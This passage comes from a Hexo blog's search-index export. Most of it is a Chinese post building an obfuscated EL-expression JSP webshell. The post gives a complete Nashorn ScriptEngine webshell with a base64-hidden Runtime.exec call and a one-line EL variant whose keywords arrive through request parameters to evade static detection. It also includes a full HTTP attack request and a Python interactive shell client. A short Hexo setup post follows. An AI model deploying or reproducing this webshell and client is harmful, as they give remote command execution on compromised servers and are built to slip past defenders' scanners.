alt="image-20220907140149065"></p><p>执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：<strong>调用ScriptEngine来执行js</strong>。</p><blockquote><p>我们使用ScriptEngine构造出的webshell是这样的：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br> <span class="hljs-type">String</span> s = <span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;</span>;<br> <span class="hljs-type">String</span> cmd = request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <span class="hljs-type">String</span> rt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;</span>));<br> <span class="hljs-built_in">Process</span> process = (<span class="hljs-built_in">Process</span>) <span class="hljs-keyword">new</span> <span class="hljs-built_in">ScriptEngineManager</span>().<span class="hljs-built_in">getEngineByName</span>(<span class="hljs-string">&quot;nashorn&quot;</span>).<span class="hljs-built_in">eval</span>(s + cmd + rt);<br> InputStreamReader reader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">InputStreamReader</span>(process.<span class="hljs-built_in">getInputStream</span>());<br> BufferedReader buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedReader</span>(reader);<br> s = null;<br> <span class="hljs-keyword">while</span> ((s = buffer.<span class="hljs-built_in">readLine</span>()) != null) &#123;<br>     response.<span class="hljs-built_in">getWriter</span>().<span class="hljs-built_in">println</span>(s);<br> &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>很好理解，获取nashorn JavaScript引擎实现命令执行。</p></blockquote><p>想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。</p><h2 id="0x02-EL-ScriptEngine"><a href="#0x02-EL-ScriptEngine" class="headerlink" title="0x02 EL + ScriptEngine"></a>0x02 EL + ScriptEngine</h2><p>首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>首先反射获取ScriptEngineManager对象：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test.jsp?<span class="hljs-attribute">spr1</span>=javax.script.ScriptEngineManager<br></code></pre></td></tr></table></figure><p>然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">try&#123;<br>    load(<span class="hljs-string">&quot;nashorn:mozilla_compat.js&quot;</span>);<br>&#125;<br>catch (e)&#123;<br>&#125;<br>importPackage(Packages.java.util);<br>importPackage(Packages.java.lang);<br>importPackage(Packages.java.io);<br>s=[2];<br>s[0]=<span class="hljs-string">&#x27;cmd&#x27;</span>;<br>s[1]=<span class="hljs-string">&#x27;/c whoami /all&#x27;</span>;<br><span class="hljs-attribute">a</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">b</span>=java.lang.Runtime.getRuntime().exec(s).getInputStream();<br>output+=new BufferedReader(new+InputStreamReader(b));<br><span class="hljs-keyword">while</span> ((<span class="hljs-attribute">line</span>=output.readLine()) != <span class="hljs-literal">null</span>) <br>&#123;<br>    <span class="hljs-attribute">o</span>=o+line+&quot;\n&quot;<br>&#125;;o<br></code></pre></td></tr></table></figure><p>然后我们将其传入执行js，最终的包长这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test.jsp?spr1=javax.script.ScriptEngineManager</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.20.10.2:8080<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=4A34A77B78CD48404804BFD7420A0195<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>414<br><br><span class="language-xquery">spr2=<span class="hljs-keyword">try</span>&#123;load(<span class="hljs-string">&quot;nashorn%3amozilla_compat.js&quot;</span>)<span class="hljs-meta">%3b</span>&#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;importPackage(Packages.java.util)<span class="hljs-meta">%3bimportPackage</span>(Packages.java<span class="hljs-built_in">.lang</span>)<span class="hljs-meta">%3bimportPackage</span>(Packages.java.io)<span class="hljs-meta">%3bs</span><span class="hljs-meta">%3d</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">%3bs</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;cmd&#x27;</span><span class="hljs-meta">%3bs</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;/c+whoami&#x27;</span><span class="hljs-meta">%3ba</span><span class="hljs-meta">%3d</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">%3bb</span><span class="hljs-meta">%3djava</span><span class="hljs-built_in">.lang</span>.Runtime.getRuntime().exec(s).getInputStream()<span class="hljs-meta">%3boutput</span>+<span class="hljs-meta">%3d</span>+new+BufferedReader(new+InputStreamReader(b))<span class="hljs-meta">%3bwhile</span>+((line<span class="hljs-meta">%3doutput</span>.readLine())+!<span class="hljs-meta">%3d</span>+null)+&#123;a<span class="hljs-meta">%3da</span><span class="hljs-meta">%2bline</span><span class="hljs-meta">%2b</span><span class="hljs-string">&quot;\n&quot;</span>&#125;<span class="hljs-meta">%3ba</span></span><br></code></pre></td></tr></table></figure><p>然后执行，没有问题。</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p><h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。</p><p>在EL表达式中，我们知道获取属性可以使用a.b或者a[‘b’]，使用后者就意味着我们可以把所有属性和方法转化成字符串：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getClass&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;forName&quot;</span>]</span>(&quot;javax.script.ScriptEngineManager&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;newInstance&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getEngineByName&quot;</span>]</span>(&quot;JavaScript&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;eval&quot;</span>]</span>(&quot;...&quot;)&#125;<br></code></pre></td></tr></table></figure><p>那么这样做有什么好处呢？</p><p>首先我们可以随意拼接：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;ge&quot;</span>+<span class="hljs-string">&quot;tCl&quot;</span>+<span class="hljs-string">&quot;ass&quot;</span>]()[<span class="hljs-string">&quot;for&quot;</span>+<span class="hljs-string">&quot;Name&quot;</span>](<span class="hljs-string">&quot;javax.scr&quot;</span>+<span class="hljs-string">&quot;ipt.ScriptEng&quot;</span>+<span class="hljs-string">&quot;ineManager&quot;</span>)[<span class="hljs-string">&quot;newIn&quot;</span>+<span class="hljs-string">&quot;stance&quot;</span>]()[<span class="hljs-string">&quot;getEng&quot;</span>+<span class="hljs-string">&quot;ineByName&quot;</span>](<span class="hljs-string">&quot;java&quot;</span>+<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-string">&quot;e&quot;</span>+<span class="hljs-string">&quot;val&quot;</span>](<span class="hljs-string">&quot;...&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>更重要的是如此我们可以将字符串通过param.xxx来传递，这样就会实现如下的改造：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>测试后可以执行：</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" alt="image-20220902101416244"></p><p>这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。</p><h2 id="0x04-小总结"><a href="#0x04-小总结" class="headerlink" title="0x04 小总结"></a>0x04 小总结</h2><p>这个小思路也是启发于星球里的师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的变种。</p><p>我们从最初的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>到</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(param.spr1)<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&quot;javascript&quot;</span>)<span class="hljs-selector-class">.eval</span>(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>再到</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>可以发现这种webshell的优势也很明显：</p><ul><li><strong>足够小，一句话就可以实现命令执行+回显的功能</strong>。</li><li><strong>避免出现&lt;%、Class、eval等敏感字符，具有bypass能力</strong>。</li></ul><p>当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#shell_mananger:</span><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>(<span class="hljs-params">cmd:<span class="hljs-built_in">str</span>,is_linux:<span class="hljs-built_in">bool</span></span>):<br>    PROXY=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8081&quot;</span>&#125;<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:8080/test.jsp&quot;</span><br><br>    headers=&#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36&quot;</span>,<br><br>        &#125;<br><br>    params=&#123;<br>        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;getClass&quot;</span>,<br>        <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;forName&quot;</span>,<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;newInstance&quot;</span>,<br>        <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;getEngineByName&quot;</span>,<br>        <span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;javascript&quot;</span>,<br>        <span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> is_linux:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br><br>    data=&#123;<br>        <span class="hljs-string">&quot;h&quot;</span>: payload<br>        <span class="hljs-comment">#注意这里换行符要对\多转义一次防止py解析</span><br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    res=requests.post(url=url, headers=headers,params=urllib.parse.urlencode(params),<br>                        data=urllib.parse.urlencode(data),proxies=<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    check=<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-keyword">in</span> check:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/12/hello-world/"/>
    <url>/2022/09/12/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem 1"></a>problem 1</h3><p>使用了图床插件，生成时会自动将图片复制到<blogname>文件夹下，但仍需要修改图片地址</p><p>将图片全部移动至_post文件夹下，注意md中图片的地址需要加上日期，如下形式：</p><p>.&#x2F;2022&#x2F;09&#x2F;12&#x2F;新型EL-webshell初探&#x2F;image-20220907140219279.png</p><h3 id="problem2"><a href="#problem2" class="headerlink" title="problem2"></a>problem2</h3><p>有时候使用花括号{}等会出现字符转义失败</p><p>修复见：<a href="https://coding.f10.org/HEXO/%E4%BF%AE%E5%A4%8Dhexo%E8%8A%B1%E6%8B%AC%E5%8F%B7%E6%98%BE%E7%A4%BA%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2123%E5%92%8C125/">https://coding.f10.org/HEXO/%E4%BF%AE%E5%A4%8Dhexo%E8%8A%B1%E6%8B%AC%E5%8F%B7%E6%98%BE%E7%A4%BA%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2123%E5%92%8C125/</a></p><p>修复文件：node_modules\highlight.js\lib\core.js#57修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-keyword">return</span> value<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#x27;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#123;/g</span>, <span class="hljs-string">&#x27;&amp;#123;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#125;/g</span>, <span class="hljs-string">&#x27;&amp;#125;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>与_config.yml#48</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">highlight:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">auto_detect:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tab_replace:</span> <span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-attr">wrap:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">hljs:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">prismjs:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">preprocess:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tab_replace:</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
